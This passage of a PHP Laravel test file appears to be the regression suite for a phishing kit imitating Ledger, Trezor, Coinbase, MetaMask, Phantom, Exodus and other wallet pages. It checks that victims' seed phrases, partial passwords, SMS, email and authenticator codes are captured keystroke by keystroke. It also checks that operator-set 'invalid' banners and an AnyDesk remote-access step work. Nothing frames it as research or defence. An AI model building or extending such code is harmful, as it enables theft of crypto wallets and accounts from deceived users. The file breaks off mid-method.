<?php

namespace Tests\Feature;

use App\Models\UserEvent;
use App\Models\UserSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Str;
use Tests\TestCase;

class ActivityV2FullRegressionTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
        ]);
    }

    public function test_ledger_1_2_3_original_issue_and_lifecycle(): void
    {
        foreach ([
            ['path' => '/ledger/1', 'page' => 'ledger_1', 'current' => 'ledger_1'],
            ['path' => '/ledger/2', 'page' => 'ledger_2', 'current' => 'ledger_2'],
            ['path' => '/ledger/3', 'page' => 'ledger_3', 'current' => 'ledger_3'],
        ] as $flow) {
            $this->assertAttemptFamily($flow['path'], $flow['page'], $flow['current'], 40);
        }
    }

    public function test_all_structured_attempt_families(): void
    {
        foreach ([
            ['path' => '/trezor/phrase-page', 'page' => 'trezor_phrase_page'],
            ['path' => '/coinbase/seed', 'page' => 'coinbase_seed', 'current' => 'coinbase_seed'],
            ['path' => '/phantom/seeds', 'page' => 'phantom_seeds'],
            ['path' => '/exodus/import', 'page' => 'exodus_import'],
            ['path' => '/metamask/import', 'page' => 'metamask_import'],
            ['path' => '/ellipal/1', 'page' => 'ellipal_24word'],
            ['path' => '/coinbase/whitelist-coinbase-wallet', 'page' => 'coinbase_whitelist_wallet', 'current' => 'coinbase_whitelist_wallet'],
        ] as $flow) {
            $this->assertAttemptFamily($flow['path'], $flow['page'], $flow['current'] ?? null, 12);
        }
    }


    public function test_coinbase_whitelist_invalid_banner_one_shot_from_loading_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/whitelist-coinbase-wallet')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbWlInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbWlInvalid=true', $defaultHtml);
        $this->assertStringContainsString('id="wl-seed-err"', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_whitelist_wallet' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/whitelist-coinbase-wallet')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbWlInvalid=true', $invalidHtml);
        $this->assertStringContainsString('getElementById("wl-seed-err")', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_whitelist_wallet'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_whitelist_wallet' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/whitelist-coinbase-wallet')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbWlInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_whitelist_wallet'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/whitelist-coinbase-wallet')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbWlInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbWlInvalid=true', $f5Html);
    }

    public function test_coinbase_reset_password_invalid_banner_one_shot_from_loading_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/reset-password')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbRpInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbRpInvalid=true', $defaultHtml);
        $this->assertStringContainsString('id="cb-rp-old-err"', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_reset_password' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/reset-password')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbRpInvalid=true', $invalidHtml);
        $this->assertStringContainsString('getElementById("cb-rp-old-err")', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_reset_password'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_reset_password' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/reset-password')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbRpInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_reset_password'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/reset-password')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbRpInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbRpInvalid=true', $f5Html);
    }

    public function test_coinbase_sign_in_invalid_opens_step_2_one_shot_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $this->withCookie('liveled_token', $token)
            ->get('/coinbase/password')
            ->assertRedirect('/coinbase/sign-in');

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/sign-in')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSiInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbSiInvalid=true', $defaultHtml);
        $this->assertStringContainsString('<html class="ll-fb"', $defaultHtml);
        $this->assertStringNotContainsString('ll-fb ll-invalid', $defaultHtml);
        $this->assertStringContainsString('#cb-si-step2 { display: none; }', $defaultHtml);
        $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-si-step1 { display: none; }', $defaultHtml);
        $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-si-step2 { display: block; }', $defaultHtml);
        $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-pw-error { display: flex;', $defaultHtml);
        $this->assertStringContainsString('id="cb-si-step1"', $defaultHtml);
        $this->assertStringContainsString('id="cb-si-step2"', $defaultHtml);
        $this->assertStringContainsString('id="cb-pw-error"', $defaultHtml);
        $this->assertStringContainsString("history.pushState({llSi:2},'',location.href);", $defaultHtml);
        $this->assertStringContainsString("window.addEventListener('popstate',function(){", $defaultHtml);
        $this->assertStringContainsString("if(onStep2) showStep1();", $defaultHtml);
        $this->assertStringNotContainsString("window.location.replace('/coinbase/loading')", $defaultHtml);
        $this->assertStringContainsString('data-testid="password-input"', $defaultHtml);
        $this->assertStringNotContainsString('test1123123@gmail.com', $defaultHtml);
        $this->assertStringNotContainsString('/coinbase/password', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_sign_in' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/sign-in')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSiInvalid=true', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $this->assertStringContainsString('<html class="ll-fb ll-invalid"', $invalidHtml);
        $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-si-step1 { display: none; }', $invalidHtml);
        $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-si-step2 { display: block; }', $invalidHtml);
        $this->assertLessThan(
            strpos($invalidHtml, '<form autocomplete="off" id="cb-si-step1">'),
            strpos($invalidHtml, 'html.ll-fb.ll-invalid #cb-si-step1 { display: none; }')
        );
        $this->assertStringContainsString('id="cb-pw-error"', $invalidHtml);
        $this->assertStringContainsString('Your email or password is incorrect, try again.', $invalidHtml);
        $this->assertStringContainsString('showStep2(storedEmail())', $invalidHtml);
        $this->assertStringContainsString("history.pushState({llSi:2},'',location.href);", $invalidHtml);

        for ($i = 0; $i < 12; $i++) {
            UserSession::where('session_token', $token)->update([
                'metadata' => ['form_state' => ['coinbase_sign_in' => 'invalid']],
            ]);
            $repeat = $this->withCookie('liveled_token', $token)->get('/coinbase/sign-in')->assertOk()->getContent();
            $this->assertStringContainsString('<html class="ll-fb ll-invalid"', $repeat, 'repeat '.$i);
            $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-si-step1 { display: none; }', $repeat, 'repeat '.$i);
            $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-si-step2 { display: block; }', $repeat, 'repeat '.$i);
            $this->assertStringContainsString('window._llCbSiInvalid=true', $repeat, 'repeat '.$i);
            $this->assertLessThan(
                strpos($repeat, '<form autocomplete="off" id="cb-si-step1">'),
                strpos($repeat, 'html.ll-fb.ll-invalid #cb-si-step1 { display: none; }'),
                'repeat '.$i
            );
        }
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_sign_in'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_sign_in' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/sign-in')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSiInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_sign_in'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/sign-in')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSiInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbSiInvalid=true', $f5Html);
    }

    public function test_coinbase_sms_invalid_banner_one_shot_from_loading_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/sms-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSmsInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbSmsInvalid=true', $defaultHtml);
        $this->assertStringContainsString('id="cb-sms-err"', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_sms_code' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->post('/coinbase/sms-code', ['cc' => '1', 'stars' => '7', 'last2' => '12'])
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSmsInvalid=true', $invalidHtml);
        $this->assertStringContainsString('getElementById("cb-sms-err")', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $this->assertStringContainsString('window._cbSmsData', $invalidHtml);
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_sms_code'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_sms_code' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/sms-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSmsInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_sms_code'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/sms-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbSmsInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbSmsInvalid=true', $f5Html);
    }


    public function test_coinbase_email_code_invalid_banner_one_shot_from_loading_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/email-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbEcInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbEcInvalid=true', $defaultHtml);
        $this->assertStringContainsString('id="cb-ec-err"', $defaultHtml);
        $this->assertStringContainsString('The code you entered is incorrect. Try again.', $defaultHtml);
        $this->assertStringNotContainsString('<script>window._cbEcData=', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_email_code' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->post('/coinbase/email-code', ['email' => 'user@gmail.com'])
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbEcInvalid=true', $invalidHtml);
        $this->assertStringContainsString(',3000)', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $this->assertStringContainsString('<script>window._cbEcData=', $invalidHtml);
        $this->assertStringContainsString('user@gmail.com', $invalidHtml);
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_email_code'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_email_code' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/email-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbEcInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_email_code'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/email-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbEcInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbEcInvalid=true', $f5Html);
    }

    public function test_coinbase_auth_invalid_banner_one_shot_from_loading_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/authenticator-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAuthInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbAuthInvalid=true', $defaultHtml);
        $this->assertStringContainsString('id="cb-auth-err"', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_authenticator_code' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/authenticator-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAuthInvalid=true', $invalidHtml);
        $this->assertStringContainsString('getElementById("cb-auth-err")', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_authenticator_code'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_authenticator_code' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/authenticator-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAuthInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_authenticator_code'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/authenticator-code')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAuthInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbAuthInvalid=true', $f5Html);
    }

    public function test_coinbase_device_confirmation_invalid_banner_one_shot_from_loading_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/device-confirmation')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbDcInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbDcInvalid=true', $defaultHtml);
        $this->assertStringContainsString('id="cb-dc-link-inp"', $defaultHtml);
        $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-dc-link-inp', $defaultHtml);
        $this->assertStringNotContainsString('<script>window._cbDcData=', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_device_confirmation' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->post('/coinbase/device-confirmation', ['email' => 'user@example.com'])
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbDcInvalid=true', $invalidHtml);
        $this->assertStringContainsString(',3000)', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $this->assertStringContainsString('<script>window._cbDcData=', $invalidHtml);
        $this->assertStringContainsString('user@example.com', $invalidHtml);
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_device_confirmation'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_device_confirmation' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/device-confirmation')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbDcInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_device_confirmation'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/device-confirmation')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbDcInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbDcInvalid=true', $f5Html);
    }

    public function test_coinbase_anydesk_invalid_banner_one_shot_from_loading_and_reload(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();

        $defaultHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/anydesk')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAdInvalid=false', $defaultHtml);
        $this->assertStringNotContainsString('window._llCbAdInvalid=true', $defaultHtml);
        $this->assertStringContainsString('id="cb-anydesk-id"', $defaultHtml);
        $this->assertStringContainsString('html.ll-fb.ll-invalid #cb-anydesk-id', $defaultHtml);
        $this->assertStringNotContainsString('id="cb-anydesk-err"', $defaultHtml);

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_anydesk' => 'invalid']],
        ]);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $invalidHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/anydesk')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAdInvalid=true', $invalidHtml);
        $this->assertStringContainsString(',3000)', $invalidHtml);
        $this->assertStringNotContainsString('cb-anydesk-err', $invalidHtml);
        $this->assertStringContainsString('ll-fb ll-invalid', $invalidHtml);
        $consumed = UserSession::where('session_token', $token)->first();
        $this->assertSame(
            'default',
            $consumed->metadata['form_state']['coinbase_anydesk'] ?? null
        );

        UserSession::where('session_token', $token)->update([
            'metadata' => ['form_state' => ['coinbase_anydesk' => 'invalid']],
        ]);
        $reloadHtml = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/anydesk')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAdInvalid=true', $reloadHtml);
        $this->assertSame(
            'default',
            UserSession::where('session_token', $token)->first()->metadata['form_state']['coinbase_anydesk'] ?? null
        );

        $f5Html = $this->withCookie('liveled_token', $token)
            ->get('/coinbase/anydesk')
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('window._llCbAdInvalid=false', $f5Html);
        $this->assertStringNotContainsString('window._llCbAdInvalid=true', $f5Html);
    }

    public function test_singleton_current_updates_stale_is_atomic_reject(): void
    {
        foreach ([
            ['page' => 'coinbase_password', 'type' => 'form_input', 'element' => 'password_partial', 'first' => 'alpha', 'next' => 'bravo', 'box' => 'password'],
            ['page' => 'coinbase_sms_code', 'type' => 'code_input', 'element' => 'code_partial', 'first' => '111111', 'next' => '222222', 'box' => 'sms'],
            ['page' => 'coinbase_sign_in', 'type' => 'form_submit', 'element' => 'email', 'first' => 'a@x.test', 'next' => 'b@x.test', 'box' => 'email'],
        ] as $case) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
            $old = UserSession::where('session_token', $token)->value('document_id');
            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['first'],
                'doc' => $old,
            ])->assertOk()->assertJson(['ok' => true]);
            $this->assertNotNull($this->box($token, $case['box']));
            $this->assertAcceptedHasSummary($token);

            $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk();
            $current = UserSession::where('session_token', $token)->value('document_id');
            $before = UserEvent::where('session_token', $token)->count();
            $beforeBox = $this->box($token, $case['box']);

            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['next'],
            ])->assertStatus(409)->assertJson(['ok' => false]);
            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['next'],
                'doc' => $old,
            ])->assertStatus(409)->assertJson(['ok' => false]);
            $this->assertSame($before, UserEvent::where('session_token', $token)->count());
            $this->assertSame($beforeBox, $this->box($token, $case['box']));

            $this->postEvent($token, [
                'type' => $case['type'],
                'page' => $case['page'],
                'element' => $case['element'],
                'value' => $case['next'],
                'doc' => $current,
            ])->assertOk();
            $this->assertAcceptedHasSummary($token);
            $this->assertSame($case['next'], $this->box($token, $case['box']));
        }
    }

    public function test_thirty_sessions_stay_isolated(): void
    {
        $rows = [];
        for ($i = 0; $i < 30; $i++) {
            $token = $this->token();
            $path = ($i % 3 === 0) ? '/ledger/1' : (($i % 3 === 1) ? '/ledger/2' : '/coinbase/seed');
            $page = ($i % 3 === 0) ? 'ledger_1' : (($i % 3 === 1) ? 'ledger_2' : 'coinbase_seed');
            $this->withCookie('liveled_token', $token)->get($path)->assertOk();
            $doc = UserSession::where('session_token', $token)->value('document_id');
            $stay = (int) $this->postEvent($token, [
                'type' => 'page_visit',
                'page' => $page,
                'doc' => $doc,
            ])->assertOk()->json('stay');
            $word = 'iso'.$i;
            $this->postEvent($token, [
                'type' => 'phrase_input',
                'page' => $page,
                'element' => 'full_state',
                'value' => json_encode(['words' => [$word], 'passphrase' => '']),
                'doc' => $doc,
                'stay' => $stay,
            ])->assertOk();
            $rows[] = [$token, $page, $word, $stay];
        }

        $this->assertSame(30, UserSession::count());
        $tokens = UserSession::pluck('session_token')->all();
        $this->assertCount(30, array_unique($tokens));

        foreach ($rows as [$token, $page, $word, $stay]) {
            $attempt = $this->lastAttempt($token, $page);
            $this->assertSame($stay, (int) $attempt['attempt_id']);
            $this->assertSame([$word], $attempt['words']);
            $this->assertSame(1, UserEvent::where('session_token', $token)->where('type', 'phrase_input')->where('element', 'full_state')->count());
            $this->assertAcceptedHasSummary($token);
        }
    }

    public function test_authority_refresh_redirect_lost_ack_and_false_success(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $docA = UserSession::where('session_token', $token)->value('document_id');
        $stay = (int) $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $docA,
        ])->assertOk()->json('stay');

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $docA,
        ])->assertOk()->assertJsonPath('stay', $stay);

        $this->withCookie('liveled_token', $token)->get('/coinbase/sign-in')->assertOk();
        $docB = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($docA, $docB);

        $before = UserEvent::where('session_token', $token)->count();
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $docA,
        ])->assertStatus(409)->assertJson(['ok' => false]);
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['late'], 'passphrase' => '']),
            'doc' => $docA,
            'stay' => $stay,
        ])->assertStatus(409)->assertJson(['ok' => false]);
        $this->assertSame($before, UserEvent::where('session_token', $token)->count());

        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'coinbase_sign_in',
            'doc' => $docB,
        ])->assertOk();
        $this->assertSame('sealed', $this->lastAttempt($token, 'ledger_3')['state']);
        $this->assertAcceptedHasSummary($token);

        $this->postEvent($token, [])->assertStatus(422)->assertJson(['ok' => false]);
        $this->withCookie('liveled_token', $this->token())->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => str_repeat('ab', 16),
        ])->assertStatus(503)->assertJson(['ok' => false]);
    }

    public function test_word_count_still_ungated_and_mismatched_doc_is_409(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc = UserSession::where('session_token', $token)->value('document_id');
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'word_count',
            'value' => '24',
        ])->assertOk();
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'word_count',
            'value' => '12',
            'doc' => 'ffffffffffffffffffffffffffffffff',
        ])->assertStatus(409);
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'word_count',
            'value' => '12',
            'doc' => $doc,
        ])->assertOk();
    }

    private function assertAttemptFamily(string $path, string $page, ?string $expectedCurrent, int $liveCount): void
    {
        $token = $this->token();
        $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
        $session = UserSession::where('session_token', $token)->first();
        $this->assertNotNull($session);
        $doc = (string) $session->document_id;
        $this->assertMatchesRegularExpression('/^[a-f0-9]{32}$/', $doc);
        $this->assertStringContainsString("window._llDocId='{$doc}'", $html);
        if ($expectedCurrent !== null) {
            $this->assertSame($expectedCurrent, $session->current_page);
        }

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['too-early'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => 1,
        ])->assertStatus(409);
        $this->assertSame(0, UserEvent::where('session_token', $token)->count());
        $this->assertNull(UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page] ?? null);

        $stay = (int) $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => $page,
            'element' => 'page',
            'doc' => $doc,
        ])->assertOk()->assertJson(['ok' => true])->json('stay');
        $this->assertGreaterThan(0, $stay);
        $this->assertAcceptedHasSummary($token);
        $this->assertSame('active', $this->lastAttempt($token, $page)['state']);
        $this->assertSame($stay, (int) $this->lastAttempt($token, $page)['attempt_id']);

        for ($i = 0; $i < $liveCount; $i++) {
            $this->postEvent($token, [
                'type' => 'phrase_input',
                'page' => $page,
                'element' => 'full_state',
                'value' => json_encode(['words' => ['w'.$i], 'passphrase' => '']),
                'doc' => $doc,
                'stay' => $stay,
            ])->assertOk()->assertJson(['ok' => true]);
        }
        $this->assertSame(1, count(UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page]));
        $this->assertSame(['w'.($liveCount - 1)], $this->lastAttempt($token, $page)['words']);
        $this->assertAcceptedHasSummary($token);

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['wrong-stay'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay + 9,
        ])->assertStatus(409);

        $this->withCookie('liveled_token', $token)->get($path)->assertOk();
        $doc2 = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($doc, $doc2);
        $this->assertSame($token, UserSession::where('session_token', $token)->value('session_token'));
        $ack = $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => $page,
            'doc' => $doc2,
        ])->assertOk()->json();
        $this->assertSame($stay, (int) $ack['stay']);
        $this->assertCount(1, UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page]);
        $this->assertSame(['w'.($liveCount - 1)], $this->lastAttempt($token, $page)['words']);

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['pre-f5'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay,
        ])->assertStatus(409);

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['after-f5'], 'passphrase' => '']),
            'doc' => $doc2,
            'stay' => $stay,
        ])->assertOk();

        $eventsBeforeSeal = UserEvent::where('session_token', $token)->count();
        $this->postEvent($token, [
            'type' => 'form_submit',
            'page' => $page,
            'element' => 'seed_phrase',
            'value' => 'after-f5',
            'doc' => $doc2,
            'stay' => $stay,
        ])->assertOk()->assertJson(['ok' => true]);
        $this->assertSame('sealed', $this->lastAttempt($token, $page)['state']);
